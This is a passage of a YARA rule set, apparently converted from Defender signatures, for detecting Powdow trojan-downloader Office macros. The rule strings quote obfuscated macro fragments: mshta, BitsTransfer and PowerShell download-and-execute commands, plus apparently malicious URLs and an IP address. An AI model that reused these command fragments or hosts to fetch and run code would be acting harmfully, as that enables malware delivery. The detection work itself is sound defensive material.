        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".ShellExecute \"P\" + fjkerooos, fgfjhfgfg, \"\", \"\", 0" ascii //weight: 1
        $x_1_2 = "fySMHDbkAM = ThisWorkbook.Sheets.Item(1)" ascii //weight: 1
        $x_1_3 = "EboPfUXaUiBeWUgxqJFJ = GetObject(o0t5)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKMU_2147793902_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKMU!MTB"
        threat_id = "2147793902"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "jvun = jvun &" ascii //weight: 1
        $x_1_2 = ".Run(nujvftidx, bljdawuuvmyoznsbkqunwwwypldqxbobddvlb)" ascii //weight: 1
        $x_1_3 = "cnl.jvx" ascii //weight: 1
        $x_1_4 = "jhtfhpu (ibeqpmnnzxqgksuktwi)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKMU_2147793902_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKMU!MTB"
        threat_id = "2147793902"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ovp = ovp &" ascii //weight: 1
        $x_1_2 = "zsnlxghozynajbtputwvqtgrbrlarjbaua (vfjfsfvyjajiyubtf)" ascii //weight: 1
        $x_1_3 = "swl.zzax" ascii //weight: 1
        $x_1_4 = ".Run(uuszsrxknkzjscestu, osttyqkmgbkghhlqwygtyncyexufttvx)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKSS_2147793987_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKSS!MTB"
        threat_id = "2147793987"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "dsfssaf = \"sdfsaf\"" ascii //weight: 1
        $x_1_2 = "dsfdas = cxzvxzsf" ascii //weight: 1
        $x_1_3 = "= Chr(ophji - 130)" ascii //weight: 1
        $x_1_4 = "'hjgjg ffhg5645n /*/" ascii //weight: 1
        $x_1_5 = {2e 52 75 6e 28 [0-50] 2c 20 [0-50] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BWK_2147794054_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BWK!MTB"
        threat_id = "2147794054"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= hKw + HV + bhhzvEXcEKi + rhrZsWyO + REskFMEnGYi + ZffZFDDNiK + XY + kQYREnCiTsB + ACSJEaBLG + cJuudsQ" ascii //weight: 1
        $x_1_2 = "uk.Run MzQDN," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BWK_2147794054_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BWK!MTB"
        threat_id = "2147794054"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= IUHLQfTHGTE + CJPT + rzXcU + XVeeaQs + RLttdyRDBas + LBEFf + pkfwXQr + GiMNiBSNVMs + VGnNiV + hH +" ascii //weight: 1
        $x_1_2 = "JOsQhMhKL.Run OfyC" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVQ_2147794469_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVQ!MTB"
        threat_id = "2147794469"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 73 68 65 65 65 20 26 20 22 [0-2] 2e ?? 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 28 [0-15] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {73 68 65 65 65 20 3d 20 22 ?? 68 65}  //weight: 1, accuracy: Low
        $x_1_3 = {50 72 69 6e 74 20 23 [0-25] 2c 20 [0-25] 20 26 20 [0-25] 20 26 20 22 20 2d 77 20 [0-20] 53 74 [0-15] 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74}  //weight: 1, accuracy: Low
        $x_1_4 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-25] 22 0d 0a 43 6c 6f 73 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKST_2147794714_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKST!MTB"
        threat_id = "2147794714"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Chr(xcdsg - 144)" ascii //weight: 1
        $x_1_2 = "dsfdas = cxzvxzsf" ascii //weight: 1
        $x_1_3 = "Function vbnghfg(xcdsg As Variant)" ascii //weight: 1
        $x_1_4 = "vxcxb = \"vxcb bxcb cbvcxb\"" ascii //weight: 1
        $x_1_5 = {2e 52 75 6e 28 [0-50] 2c 20 [0-50] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BBS_2147795138_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BBS!MTB"
        threat_id = "2147795138"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run cvgkjwG347rtHDFFGe46.TextBox1.Text & hrkwdjksdjbk, 0" ascii //weight: 1
        $x_1_2 = "= Cells(sdfghasdASfHSdrtsyg46sdrgasdf, cdvgnfhaiwuet4uThSdG34t)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BBS_2147795138_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BBS!MTB"
        threat_id = "2147795138"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "-w hi slee^p -Se 31;Sta^rt-BitsTr^ansfer -Source htt" ascii //weight: 1
        $x_1_2 = "-Destination C:\\Users\\Public\\Documents\\lineseries.e`xe" ascii //weight: 1
        $x_1_3 = "= \"C:\\Users\\Public\\Documents\\whenstep.cm\" & Chr(CLng(\"99.6\"))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKSN_2147795275_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKSN!MTB"
        threat_id = "2147795275"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "dasfsd = zxczx" ascii //weight: 1
        $x_1_2 = "Call ebzxp.awoiceecjpjxticyffnb" ascii //weight: 1
        $x_1_3 = "dsfdsa = 12321" ascii //weight: 1
        $x_1_4 = "ngxetjb = hbjsd(" ascii //weight: 1
        $x_1_5 = {2e 52 75 6e 28 [0-50] 2c 20 [0-50] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDA_2147795285_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDA!MTB"
        threat_id = "2147795285"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"Bxwyizwezcjvraatsvhoa.bat\"" ascii //weight: 1
        $x_1_2 = "\"ECHO Converting Excel Files to PDF, Please wait...\"" ascii //weight: 1
        $x_1_3 = "JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBWAG0AaQBqAHUAYgBhAHMAawBnAHEAYgBmAG0AagBvAGIAdgBkAC4AZQB4AGUAIgA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdA" ascii //weight: 1
        $x_1_4 = "Shell(sBatchFile, vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKM_2147795357_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKM!MTB"
        threat_id = "2147795357"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "call1 = \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe\"" ascii //weight: 1
        $x_1_2 = "start /MIN C:\\Windo\" + \"ws\\SysWOW64\\\" + call1 + \" -win 1 -enc \" + enc" ascii //weight: 1
        $x_1_3 = {62 61 74 63 68 20 3d 20 22 [0-30] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_4 = "i = Shell(batch, 0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKSU_2147795515_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKSU!MTB"
        threat_id = "2147795515"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "dasfsd = zxczx" ascii //weight: 1
        $x_1_2 = "Call bhekdlsv.sqppmlmxxrxelvmsgjrj" ascii //weight: 1
        $x_1_3 = "dsfdsa = 12321" ascii //weight: 1
        $x_1_4 = "ewpbkbr = 70 - 70" ascii //weight: 1
        $x_1_5 = {2e 52 75 6e 28 [0-50] 2c 20 [0-50] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDS_2147795779_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDS!MTB"
        threat_id = "2147795779"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"znvcxnxcbxncbxncdjkf\"" ascii //weight: 1
        $x_1_2 = "MsgBox XOREncryption(\")" ascii //weight: 1
        $x_1_3 = {3d 20 45 6e 76 69 72 6f 6e 24 28 58 4f 52 45 6e 63 72 79 70 74 69 6f 6e 28 22 [0-10] 22 2c 20 22 73 67 63 6f 59 37 4c 22 29 29 20 26 20 58 4f 52 45 6e 63 72 79 70 74 69 6f 6e 28 22 3d [0-10] 22 2c 20 22 61 75 4a 77 63 59 22 29 20 2b 20 6b 61 6f 73 6b 61 73 64 6b 6f 20 2b 20 61 64 6a 77 69 64 6a 75 77}  //weight: 1, accuracy: Low
        $x_1_4 = {47 65 74 4f 62 6a 65 63 74 28 58 4f 52 45 6e 63 72 79 70 74 69 6f 6e 28 22 [0-10] 22 2c 20 22 5a 66 31 31 31 62 46 22 29 29 2e 47 65 74 28 58 4f 52 45 6e 63 72 79 70 74 69 6f 6e 28 22 [0-15] 22 2c 20 22 50 4a 57 47 22 29 29 2e 43 72 65 61 74 65 20 61 64 6a 77 69 75 64 79 77 2c 20 4e 75 6c 6c 2c}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 63 6f 70 79 66 69 6c 65 20 58 4f 52 45 6e 63 72 79 70 74 69 6f 6e 28 22 [0-31] 22 2c 20 22 56 35 70 37 22 29 2c 20 45 6e 76 69 72 6f 6e 24 28 58 4f 52 45 6e 63 72 79 70 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKI_2147795780_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKI!MTB"
        threat_id = "2147795780"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe\"" ascii //weight: 1
        $x_1_2 = "start /MIN C:\\Windo\"" ascii //weight: 1
        $x_1_3 = {62 61 74 63 68 20 3d 20 22 [0-30] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_4 = "i = Shell(batch, 0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SSM_2147795873_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SSM!MTB"
        threat_id = "2147795873"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c m^sh^t^a h^tt^p^:/^/87.251.85.100/love/love7.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SSM_2147795873_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SSM!MTB"
        threat_id = "2147795873"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set coll = FilenamesCollection(folder$, \"*.xls*\")" ascii //weight: 1
        $x_1_2 = "Set WB = Workbooks.Open(FileName, , , , PassOld$)" ascii //weight: 1
        $x_1_3 = {54 68 65 6e 20 [0-21] 20 3d 20 00 20 2b 20 22 3a 5c 70 72 6f 22 20 2b 20 [0-21] 20 2b 20 22 67 72 61 6d 64 22}  //weight: 1, accuracy: Low
        $x_1_4 = "+ \"ata\\sdfhiuwu.b\"" ascii //weight: 1
        $x_1_5 = {53 68 65 6c 6c 20 66 68 32 6f 65 38 77 64 73 68 66 20 2b 20 22 61 74 22 2c 20 30 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SSM_2147795873_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SSM!MTB"
        threat_id = "2147795873"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-3] 62 61 74 63 68 20 3d 20 22 [0-37] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Print #1, \"start /MIN C:\\Windo\" + \"ws\\SysWOW64\\\" + call1 + \" -win 1 -enc \" +" ascii //weight: 1
        $x_1_3 = {69 20 3d 20 53 68 65 6c 6c 28 62 61 74 63 68 2c 20 30 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = "call1 = \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SSM_2147795873_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SSM!MTB"
        threat_id = "2147795873"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (M_S + JARDINOPOLIS44 + M_S1 + M_S2 + M_S3), 0" ascii //weight: 1
        $x_1_2 = "= \"https://www.4sync.com/web/directDownload/GOGJKyyl/-fgfgdKS.d10e2b5d3f8b5002f9af82cb97b28d41" ascii //weight: 1
        $x_1_3 = "URLDownloadToFile 0, ImagemSimplesCDT, JURULANDIA12 & \"document.exe\", 0, 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PHBC_2147795997_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PHBC!MTB"
        threat_id = "2147795997"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "htt`p://greenpayindia.com/wp-conternt/ConsoleApp18.e`xe" ascii //weight: 1
        $x_1_2 = {44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-20] 2e 65 60 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVR_2147796194_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVR!MTB"
        threat_id = "2147796194"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"new:13709620-C279-11CE-A49E-444553540000\")" ascii //weight: 1
        $x_1_2 = "objMMC1.ShellExecute dd, \"http://bitly.com/asdasdjqwhdioquwhk\", \"\"," ascii //weight: 1
        $x_1_3 = "sh.TextFrame.TextRange.Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BKT_2147796197_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BKT!MTB"
        threat_id = "2147796197"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sheee = \"shel\"" ascii //weight: 1
        $x_1_2 = "= \"C:\\Users\\Public\\Documents\\himselfdespite.cm\" & Chr(CLng(97.5) + CLng(1.6))" ascii //weight: 1
        $x_1_3 = "-w hi slee^p -Se 31;Sta^rt-BitsTrans^fer -Source htt" ascii //weight: 1
        $x_1_4 = "= CreateObject(sheee & \"l.application\").Open" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PHBB_2147796554_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PHBB!MTB"
        threat_id = "2147796554"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 20 2d 77 20 68 69 20 73 6c 65 65 5e 70 20 2d 53 65 20 33 31 3b 53 74 61 5e 72 74 2d 42 69 74 73 54 72 61 6e 73 5e 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 [0-2] 3a 2f 2f [0-106] 2f [0-20] 2e 65 60 78 65 22 20 26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-20] 2e 65 60 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = "obh = CreateObject(sheee & \"l.application\").Open(" ascii //weight: 1
        $x_1_3 = "sheee = \"shel\"" ascii //weight: 1
        $x_1_4 = {3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-20] 2e 63 6d 22 20 26 20 43 68 72 28 43 4c 6e 67 28 39 37 2e 35 29 20 2b 20 43 4c 6e 67 28 31 2e 36 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"pow^ers\"" ascii //weight: 1
        $x_1_6 = "= \"he^ll\"" ascii //weight: 1
        $x_1_7 = "= FreeFile" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVS_2147796635_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVS!MTB"
        threat_id = "2147796635"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "k1.k2.Tag, \"https://www.bitly.com/wdkdwkdowkdrufhjwijjd\", \"\"" ascii //weight: 1
        $x_1_2 = "k1.k2.Tag, \"https://www.bitly.com/wdowdpowdrufhjwijjd\", \"\"" ascii //weight: 1
        $x_1_3 = "objShell = CreateObject(\"Shell.Application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SMA_2147796840_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SMA!MTB"
        threat_id = "2147796840"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Down\" & \"loa\" & \"dStr\" & \"ing( 'https://pt.textbin.net/download/x7sf6t2dgv' )" ascii //weight: 1
        $x_1_2 = "| Out-File -FilePath x.js -force" ascii //weight: 1
        $x_1_3 = {43 61 6c 6c 20 53 68 65 6c 6c 28 22 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 63 6f 6d 6d 61 6e 64 20 22 20 26 20 [0-31] 20 26 20 22 20 3b 20 65 78 69 74 20 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SMA_2147796840_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SMA!MTB"
        threat_id = "2147796840"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 4d 6f 64 75 6c 65 31 31 22 [0-3] 53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29 [0-3] 4d 73 67 42 6f 78 20 22 45 72 72 6f 72 21 21}  //weight: 1, accuracy: Low
        $x_1_2 = "Set objShell = CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_3 = {43 61 6c 6c 20 6f 62 6a 53 68 65 6c 6c 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 28 6b 31 2e 6b 32 2e 54 61 67 2c 20 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 62 69 74 6c 79 2e 63 6f 6d 2f [0-37] 22 2c 20 22 22 2c 20 22 6f 70 65 6e 22 2c 20 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVT_2147797575_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVT!MTB"
        threat_id = "2147797575"
        type = "TrojanDownloader"
